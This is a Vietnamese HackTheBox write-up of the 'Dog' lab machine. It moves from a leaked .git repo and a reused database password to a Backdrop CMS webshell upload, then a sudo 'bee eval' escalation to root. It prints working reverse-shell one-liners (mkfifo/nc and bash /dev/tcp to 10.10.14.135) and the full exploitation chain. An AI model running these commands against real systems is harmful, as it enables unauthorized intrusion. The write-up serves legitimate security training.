@@ -1,0 +1,635 @@
+---
+title: Hackthebox - Dog
+date: 2025-04-01
+tags:
+  - backdrop
+  - git
+  - ssh
+  - bee - backdrop
+  - linux
+---
+
+## Reconnaissance and Scanning
+
+```bash
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
+|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
+|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 22 disallowed entries
+| /core/ /profiles/ /README.md /web.config /admin
+| /comment/reply /filter/tips /node/add /search /user/register
+| /user/password /user/login /user/logout /?q=admin /?q=comment/reply
+| /?q=filter/tips /?q=node/add /?q=search /?q=user/password
+|_/?q=user/register /?q=user/login /?q=user/logout
+|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
+|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Home | Dog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Enumeration and Gaining access
+
+### Vhost, directories
+
+Tìm directories
+
+```bash
+301   309B   http://10.10.11.58/.git    -> REDIRECTS TO: http://10.10.11.58/.git/
+200    73B   http://10.10.11.58/.git/description
+200    95B   http://10.10.11.58/.git/COMMIT_EDITMSG
+200    23B   http://10.10.11.58/.git/HEAD
+200   604B   http://10.10.11.58/.git/
+200   409B   http://10.10.11.58/.git/branches/
+200    92B   http://10.10.11.58/.git/config
+200   240B   http://10.10.11.58/.git/info/exclude
+200   476B   http://10.10.11.58/.git/logs/
+200   650B   http://10.10.11.58/.git/hooks/
+200   455B   http://10.10.11.58/.git/info/
+200   230B   http://10.10.11.58/.git/logs/HEAD
+301   319B   http://10.10.11.58/.git/logs/refs    -> REDIRECTS TO: http://10.10.11.58/.git/logs/refs/
+301   325B   http://10.10.11.58/.git/logs/refs/heads    -> REDIRECTS TO: http://10.10.11.58/.git/logs/refs/heads/
+301   320B   http://10.10.11.58/.git/refs/heads    -> REDIRECTS TO: http://10.10.11.58/.git/refs/heads/
+200   230B   http://10.10.11.58/.git/logs/refs/heads/master
+200   461B   http://10.10.11.58/.git/refs/
+200    41B   http://10.10.11.58/.git/refs/heads/master
+301   319B   http://10.10.11.58/.git/refs/tags    -> REDIRECTS TO: http://10.10.11.58/.git/refs/tags/
+200   337KB  http://10.10.11.58/.git/index
+200     2KB  http://10.10.11.58/.git/objects/
+403   276B   http://10.10.11.58/.ht_wsr.txt
+403   276B   http://10.10.11.58/.htaccess.bak1
+403   276B   http://10.10.11.58/.htaccess.sample
+403   276B   http://10.10.11.58/.htaccess.orig
+403   276B   http://10.10.11.58/.htaccess.save
+403   276B   http://10.10.11.58/.htaccess_orig
+403   276B   http://10.10.11.58/.htaccess_extra
+403   276B   http://10.10.11.58/.htaccess_sc
+403   276B   http://10.10.11.58/.htaccessOLD
+403   276B   http://10.10.11.58/.htaccessOLD2
+403   276B   http://10.10.11.58/.htaccessBAK
+403   276B   http://10.10.11.58/.html
+403   276B   http://10.10.11.58/.htm
+403   276B   http://10.10.11.58/.htpasswd_test
+403   276B   http://10.10.11.58/.httr-oauth
+403   276B   http://10.10.11.58/.htpasswds
+403   276B   http://10.10.11.58/.php
+301   309B   http://10.10.11.58/core    -> REDIRECTS TO: http://10.10.11.58/core/
+301   310B   http://10.10.11.58/files    -> REDIRECTS TO: http://10.10.11.58/files/
+200   586B   http://10.10.11.58/files/
+404     2KB  http://10.10.11.58/index.php/login/
+200   456B   http://10.10.11.58/layouts/
+200     7KB  http://10.10.11.58/LICENSE.txt
+301   312B   http://10.10.11.58/modules    -> REDIRECTS TO: http://10.10.11.58/modules/
+200   399B   http://10.10.11.58/modules/
+200     5KB  http://10.10.11.58/README.md
+200   528B   http://10.10.11.58/robots.txt
+403   276B   http://10.10.11.58/server-status/
+403   276B   http://10.10.11.58/server-status
+200     0B   http://10.10.11.58/settings.php
+301   310B   http://10.10.11.58/sites    -> REDIRECTS TO: http://10.10.11.58/sites/
+301   311B   http://10.10.11.58/themes    -> REDIRECTS TO: http://10.10.11.58/themes/
+200   454B   http://10.10.11.58/themes/
+```
+
+Tìm vhost, tuy nhiên tôi không tìm thấy vhost nào. Quay trở lại các directories thì tôi có git. 
+
+### .git
+
+Sử dụng [git-dumper](https://github.com/arthaud/git-dumper) để dump được repo này ra
+
+```bash
+neo@fs0c13ty ~/htb/machines/dog$ git-dumper http://10.10.11.58/.git/ dumped_repo
+[-] Testing http://10.10.11.58/.git/HEAD [200]
+[-] Testing http://10.10.11.58/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://10.10.11.58/.git/ [200]
+[-] Fetching http://10.10.11.58/.gitignore [404]
+[-] http://10.10.11.58/.gitignore responded with status code 404
+[-] Fetching http://10.10.11.58/.git/objects/ [200]
+[-] Fetching http://10.10.11.58/.git/logs/ [200]
+.......
+[-] Fetching http://10.10.11.58/.git/objects/e6/d15eb7293e0fdbb869080b6b5ff42810df6726 [200]
+[-] Fetching http://10.10.11.58/.git/objects/e6/f614f30aa8fd1c3e1cc2e1983b4d30f16ea3cd [200]
+[-] Fetching http://10.10.11.58/.git/objects/e6/fe4d122e7f434cffa1bede170208a54f526552 [200]
+[-] Sanitizing .git/config
+[-] Running git checkout .
+Updated 2873 paths from the index
+neo@fs0c13ty ~/htb/machines/dog$ ll dumped_repo
+total 80K
+drwxr-xr-x 9 neo neo 4.0K Apr 14 14:08 core
+drwxr-xr-x 7 neo neo 4.0K Apr 14 14:08 files
+-rwxr-xr-x 1 neo neo  578 Apr 14 14:08 index.php
+drwxr-xr-x 2 neo neo 4.0K Apr 14 14:08 layouts
+-rwxr-xr-x 1 neo neo  18K Apr 14 14:08 LICENSE.txt
+-rwxr-xr-x 1 neo neo 5.2K Apr 14 14:08 README.md
+-rwxr-xr-x 1 neo neo 1.2K Apr 14 14:08 robots.txt
+-rwxr-xr-x 1 neo neo  22K Apr 14 14:08 settings.php
+drwxr-xr-x 2 neo neo 4.0K Apr 14 14:08 sites
+drwxr-xr-x 2 neo neo 4.0K Apr 14 14:08 themes
+```
+
+`settings.php`
+
+```bash
+neo@fs0c13ty ~/htb/machines/dog$ cat dumped_repo/settings.php
+<?php
+/**
+ * @file
+ * Main Backdrop CMS configuration file.
+ */
+
+/**
+ * Database configuration:
+ *
+ * Most sites can configure their database by entering the connection string
+ * below. If using primary/replica databases or multiple connections, see the
+ * advanced database documentation at
+ * https://api.backdropcms.org/database-configuration
+ */
+$database = 'mysql://root:BackDropJ*******DS2024@127.0.0.1/backdrop';
+$database_prefix = '';
+
+/**
+ * Site configuration files location.
+```
+
+Vậy là ở đây tôi biết được server sử dụng mysql và có pass của root khi login mysql. Tuy nhiên chỉ là db trên local, không thể login từ bên ngoài do port 3306 không mở. Tôi sẽ lưu nó lại và tiếp tục đào sâu hơn và git repo này.
+
+Tìm kiếm các thông tin cơ bản như username, password, mysql, config.php, domain, ... tôi tìm thấy 1 user
+
+```bash
+neo@fs0c13ty ~/htb/machines/dog$ grep -rni "@dog.htb" ./dumped_repo
+./dumped_repo/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:12:        "tiffany@dog.htb"
+```
+
+Thử login ssh với thông tin đã thu thập được: `tiffany:BackDropJ2024DS2024` nhưng không có kết quả, vậy thì có 2 khả năng xảy ra ở đây:
+- Password của user `tiffany` sai.
+- Không tồn tại user `tiffany` trong máy chủ.
+
+Tuy nhiên thì tạm thời chưa có cách nào để check được 2 trường hợp này, brute-force chỉ là phương án cuối cùng.
+
+### Backdrop CMS
+
+Tôi còn nguyên 1 trang web chưa check. Giờ là lúc vào xem nó có gì.
+
+![one](1.png)
+
+Nhìn một lượt thì tôi có thêm 2 author là *dogBackDropSystem* và *Anonymous*, đây cũng có thể là 2 user để login được vào trang web.
+
+Quay trở lại phần directories phía trên thì tôi có `/robots.txt`
+
+```bash
+#
+# robots.txt
+#
+# This file is to prevent the crawling and indexing of certain parts
+# of your site by web crawlers and spiders run by sites like Yahoo!
+# and Google. By telling these "robots" where not to go on your site,
+# you save bandwidth and server resources.
+#
+# This file will be ignored unless it is at the root of your host:
+# Used:    http://example.com/robots.txt
+# Ignored: http://example.com/site/robots.txt
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/robotstxt.html
+#
+# For syntax checking, see:
+# http://www.robotstxt.org/checker.html
+
+User-agent: *
+Crawl-delay: 10
+# Directories
+Disallow: /core/
+Disallow: /profiles/
+# Files
+Disallow: /README.md
+Disallow: /web.config
+# Paths (clean URLs)
+Disallow: /admin
+Disallow: /comment/reply
+Disallow: /filter/tips
+Disallow: /node/add
+Disallow: /search
+Disallow: /user/register
+Disallow: /user/password
+Disallow: /user/login
+Disallow: /user/logout
+# Paths (no clean URLs)
+Disallow: /?q=admin
+Disallow: /?q=comment/reply
+Disallow: /?q=filter/tips
+Disallow: /?q=node/add
+Disallow: /?q=search
+Disallow: /?q=user/password
+Disallow: /?q=user/register
+Disallow: /?q=user/login
+Disallow: /?q=user/logout
+```
+
+Tôi có cả phần login và register ở đây, nhưng không truy cập register để đăng ký tài khoản mới, nên tôi sẽ thử login với những gì tôi đang có.
+
+Sau khi thử các khả năng với các username:password đã có thì tôi đã login được với `tiffany:BackDropJ2024DS2024`
+
+![two](2.png)
+
+Xem Wappalyzer, tôi biết được web dùng Backdrop - 1 CMS được phát triển dựa trên Drupal. Tìm kiếm lỗ hổng của Backdrop 1 trên Exploit-DB, tôi tìm được [Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/52021)
+
+Phân tích exploit này một chút, Backdrop cho phép người dùng admin upload module dạng .zip hoặc .tar.gz thông qua GUI `/admin/modules/install`. Exploit sẽ tạo 1 webshell php, nén nó dưới dạng zip và tải lên như 1 module giả. Cuối cùng truy cập webshell bằng đường dẫn `/modules/shell/shell.php`
+
+Đầu tiên tạo file zip chưa webshell 
+
+```bash
+neo@fs0c13ty ~/htb/machines/dog$ python 52021.py http://10.10.11.58
+Backdrop CMS 1.27.1 - Remote Command Execution Exploit
+Evil module generating...
+Evil module generated! shell.zip
+Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
+Your shell address: http://10.10.11.58/modules/shell/shell.php
+neo@fs0c13ty ~/htb/machines/dog$ ll
+total 32K
+-rwxr-xr-x 1 neo neo 2.6K Apr 13 13:52 52021.py
+-rw-r--r-- 1 neo neo 3.0K Apr 13 13:14 dirsearch.txt
+drwxr-xr-x 8 neo neo 4.0K Apr 14 14:08 dumped_repo
+drwxr-xr-x 7 neo neo 4.0K Apr 13 13:16 GitTools
+-rw-r--r-- 1 neo neo 2.4K Apr 13 12:18 nmap
+drwxr-xr-x 2 neo neo 4.0K Apr 13 13:13 reports
+drwxr-xr-x 2 neo neo 4.0K Apr 15 15:58 shell
+-rw-r--r-- 1 neo neo 1.1K Apr 15 15:58 shell.zip
+```
+
+Tiếp theo vào phần modules trên GUI để tải lên module
+
+Functionality -> Install new modules -> Manual installation
+
+Để tải lên được file zip, buộc phải chọn vào option 3: Upload a module, theme, or layout archive to install
+
+![three](3.png)
+
+Tuy nhiên để upload file thì cần chuyển nó từ .zip sang .tar.gz và cuối cùng chọn INSTALL
+
+```bash
+neo@fs0c13ty ~/htb/machines/dog$ tar -czf shell.tar.gz shell/
+neo@fs0c13ty ~/htb/machines/dog$ ll
+total 36K
+-rwxr-xr-x 1 neo neo 2.6K Apr 13 13:52 52021.py
+-rw-r--r-- 1 neo neo 3.0K Apr 13 13:14 dirsearch.txt
+drwxr-xr-x 8 neo neo 4.0K Apr 14 14:08 dumped_repo
+drwxr-xr-x 7 neo neo 4.0K Apr 13 13:16 GitTools
+-rw-r--r-- 1 neo neo 2.4K Apr 13 12:18 nmap
+drwxr-xr-x 2 neo neo 4.0K Apr 13 13:13 reports
+drwxr-xr-x 2 neo neo 4.0K Apr 15 15:58 shell
+-rw-r--r-- 1 neo neo  671 Apr 15 16:00 shell.tar.gz
+-rw-r--r-- 1 neo neo 1.1K Apr 15 15:58 shell.zip
+```
+
+![four](4.png)
+
+Truy cập lại vào link webshell như trong code exploit
+
+`http://10.10.11.58/modules/shell/shell.php`
+
+![five](5.png)
+
+Tôi sẽ thêm payload để lấy revershell
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.135 9001 >/tmp/f`
+
+Một lưu ý nhỏ ở đây là webshell có bị mất sau 1 lúc sử dụng, chỉ cần install lại modules như các bước ở trên là dùng tiếp được bình thường. 
+
+Bật listener với port 9001 
+
+```bash
+neo@fs0c13ty ~/htb/machines/dog$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.135] from (UNKNOWN) [10.10.11.58] 54348
+bash: cannot set terminal process group (889): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dog:/var/www/html/modules/shell$
+www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+www-data@dog:/var/www/html/modules/shell$ ls -la /home
+ls -la /home
+total 16
+drwxr-xr-x  4 root       root       4096 Aug 15  2024 .
+drwxr-xr-x 19 root       root       4096 Feb  7 18:31 ..
+drwxr-xr-x  4 jobert     jobert     4096 Feb  7 15:59 jobert
+drwxr-xr-x  3 johncusack johncusack 4096 Feb  7 15:59 johncusack
+```
+
+Hiện tại tôi có 2 user *jobert* và *johncusack*, theo như trong file passwd thì permission của *jobert* cao hơn.
+
+Tôi sẽ thử password tôi đã có với cả 2 user này.
+
+```bash
+www-data@dog:/var/www/html/modules/shell$ su jobert
+su jobert
+Password: BackDropJ*******DS2024
+su: Authentication failure
+www-data@dog:/var/www/html/modules/shell$ su johncusack
+su johncusack
+Password: BackDropJ*******DS2024
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+id
+uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
+```
+
+```bash
+neo@fs0c13ty ~$ ssh johncusack@10.10.11.58                                         
+johncusack@10.10.11.58's password:
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 15 Apr 2025 09:44:21 AM UTC
+
+  System load:           0.02
+  Usage of /:            48.2% of 6.32GB
+  Memory usage:          24%
+  Swap usage:            0%
+  Processes:             242
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.58
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:7f76
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Apr 15 08:43:27 2025 from 10.10.14.58
+johncusack@dog:~$ ls
+user.txt
+johncusack@dog:~$
+```
+
+## Privilege escalation
+
+`sudo -l`
+
+```bash
+johncusack@dog:~$ sudo -l
+[sudo] password for johncusack:
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
+```
+
+Tìm hiểu thông tin về thằng bee này
+
+```bash
+johncusack@dog:~$ strings /usr/local/bin/bee
+#!/usr/bin/env php
+<?php
+ * @file
+ * A command line utility for Backdrop CMS.
+// Exit gracefully with a meaningful message if installed within a web
+// accessible location and accessed in the browser.
+if (!bee_is_cli()) {
+  echo bee_browser_load_html();
+  die();
+// Set custom error handler.
+set_error_handler('bee_error_handler');
+// Include files.
+require_once __DIR__ . '/includes/miscellaneous.inc';
+require_once __DIR__ . '/includes/command.inc';
+require_once __DIR__ . '/includes/render.inc';
+require_once __DIR__ . '/includes/filesystem.inc';
+require_once __DIR__ . '/includes/input.inc';
+require_once __DIR__ . '/includes/globals.inc';
+// Main execution code.
+bee_initialize_server();
+bee_parse_input();
+bee_initialize_console();
+bee_process_command();
+bee_print_messages();
+bee_display_output();
+exit();
+ * Custom error handler for `bee`.
+ * @param int $error_level
+ *   The level of the error.
+ * @param string $message
+ *   Error message to output to the user.
+ * @param string $filename
+ *   The file that the error came from.
+ * @param int $line
+ *   The line number the error came from.
+ * @param array $context
+ *   An array of all variables from where the error was triggered.
+ * @see https://www.php.net/manual/en/function.set-error-handler.php
+ * @see _backdrop_error_handler()
+function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {
+  require_once __DIR__ . '/includes/errors.inc';
+  _bee_error_handler_real($error_level, $message, $filename, $line, $context);
+ * Detects whether the current script is running in a command-line environment.
+function bee_is_cli() {
+  return (empty($_SERVER['SERVER_SOFTWARE']) && (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) && $_SERVER['argc'] > 0)));
+ * Return the HTML to display if this page is loaded in the browser.
+ * @return string
+ *   The concatentated html to display.
+function bee_browser_load_html() {
+  // Set the title to use in h1 and title elements.
+  $title = "Bee Gone!";
+  // Place a white block over "#!/usr/bin/env php" as this is output before
+  // anything else.
+  $browser_output = "<div style='background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;'>&nbsp;</div>";
+  // Add the bee logo and style appropriately.
+  $browser_output .= "<img src='./images/bee.png' align='right' width='150' height='157' style='max-width:100%;margin-top:3rem;'>";
+  // Add meaningful text.
+  $browser_output .= "<h1 style='font-family:Tahoma;'>$title</h1>";
+  $browser_output .= "<p style='font-family:Verdana;'>Bee is a command line tool only and will not work in the browser.</p>";
+  // Add the document title using javascript when the window loads.
+  $browser_output .= "<script>window.onload = function(){document.title='$title';}</script>";
+  // Output the combined string.
+  return $browser_output;
+```
+
+Ở dòng đâu tiên đã cung cấp cho tôi biết đây là 1 CLI của Backdrop CMS. Đi hỏi Chatgpt thì nó đưa cho tôi 1 số gợi ý về việc leo thang đặc quyền dựa vào thằng bee này. Đầu tiên là xem và phân tích các options của nó
+
+```bash
+johncusack@dog:~$ sudo /usr/local/bin/bee help
+🐝 Bee
+Usage: bee [global-options] <command> [options] [arguments]
+
+Global Options:
+ --root
+ Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+
+ --site
+ Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.
+
+ --base-url
+ Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.
+
+ --yes, -y
+ Answer 'yes' to questions without prompting.
+
+ --debug, -d
+ Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).
+.....
+```
+
+Đưa hết phần help này cho ChatGPT thì nó đưa ra cho tôi gợi ý về option `eval`
+
+```bash
+johncusack@dog:~$ sudo /usr/local/bin/bee help | grep eval
+  eval
+   ev, php-eval
+```
+
+Tôi có thể thực thi mã PHP tùy ý với quyền `root` sau khi bootstrap Backdrop.
+
+Đọc thêm về [eval](https://github.com/backdrop-contrib/bee/blob/1.x-1.x/docs/Usage.md#eval), tôi sẽ thử câu lệnh execute shell 
+
+`sudo /usr/local/bin/bee eval 'shell_exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.135/4444 0>&1\'");'`
+
+Bật listener với port 4444 trước khi chạy payload
+
+`nc -lnvp 4444`
+
+```bash
+johncusack@dog:~$ sudo /usr/local/bin/bee eval 'shell_exec("/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.135/4444 0>&1\"");'
+
+ ✘  The required bootstrap level for 'eval' is not ready.
+```
+
+Tuy nhiên bên shell của tôi lại hiện lỗi
+
+```bash
+neo@fs0c13ty ~$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.135] from (UNKNOWN) [10.10.11.58] 33130
+-bash: 1");: ambiguous redirect
+```
+
+Quay ra hỏi ChatGPT thì nó bảo 
+
+![six](6.png)
+
+Tóm lại cách sửa là tôi phải tìm thư mục mã nguồn của Backdrop, nơi chứa file `settings.php` và đặt nó thành `--root` và đặt `--site` thành default
+
+Tìm thư mục chứa `settings.php`
+
+```bash
+johncusack@dog:~$ ll /var/www/
+total 12
+drwxr-xr-x  3 root     root     4096 Jul  8  2024 ./
+drwxr-xr-x 13 root     root     4096 Aug 15  2024 ../
+drwxrwxr-x  9 www-data www-data 4096 Apr 15 07:45 html/
+johncusack@dog:~$ ll /var/www/html/
+total 904
+drwxrwxr-x 9 www-data www-data   4096 Apr 15 07:45 ./
+drwxr-xr-x 3 root     root       4096 Jul  8  2024 ../
+drwxrwx--- 9 www-data www-data   4096 Jul  8  2024 core/
+drwxrwx--- 8 www-data www-data   4096 Apr 15 13:39 files/
+drwxr-xr-x 8 root     root       4096 Feb  7 21:22 .git/
+-rwxrwx--- 1 www-data www-data    578 Mar  7  2024 index.php*
+drwxrwx--- 2 www-data www-data   4096 Jul  8  2024 layouts/
+-rwxrwx--- 1 www-data www-data  18092 Mar  7  2024 LICENSE.txt*
+-rw-rw-rw- 1 www-data www-data 824745 Oct 18 03:45 linpeas.sh
+drwxrwx--- 2 www-data www-data   4096 Apr 15 13:42 modules/
+-rwxrwx--- 1 www-data www-data   5285 Mar  7  2024 README.md*
+-rwxrwx--- 1 www-data www-data   1198 Mar  7  2024 robots.txt*
+-rwxrwx--- 1 www-data www-data  21732 Jul  8  2024 settings.php*
+drwxrwx--- 2 www-data www-data   4096 Jul  8  2024 sites/
+drwxrwx--- 2 www-data www-data   4096 Jul  8  2024 themes/
+```
+
+Sửa lại payload và chạy nó trên máy victim. Tất nhiên là trước đó phải bật lại listener
+
+```bash
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html --site=default eval 'shell_exec("/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.135/4444 0>&1\"");'
+```
+
+```bash
+neo@fs0c13ty ~$ nc -lvnp 4444                                                                                                                                    1 ↵
+listening on [any] 4444 ...
+connect to [10.10.14.135] from (UNKNOWN) [10.10.11.58] 35856
+root@dog:/var/www/html# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@dog:/var/www/html# cd
+root@dog:~# ls -la
+ls -la
+total 44
+drwx------  5 root root 4096 Apr 15 03:11 .
+drwxr-xr-x 19 root root 4096 Feb  7 18:31 ..
+lrwxrwxrwx  1 root root    9 Feb  7 15:59 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Jan 29 15:49 .cache
+-rw-r--r--  1 root root   94 Aug 15  2024 .gitconfig
+drwxr-xr-x  3 root root 4096 Jul  9  2024 .local
+lrwxrwxrwx  1 root root    9 Feb  7 15:59 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r-----  1 root root   33 Apr 15 03:11 root.txt
+-rw-r--r--  1 root root   66 Jul 11  2024 .selected_editor
+drwx------  2 root root 4096 Jul  8  2024 .ssh
+-rw-r--r--  1 root root  165 Feb  7 15:59 .wget-hsts
+```
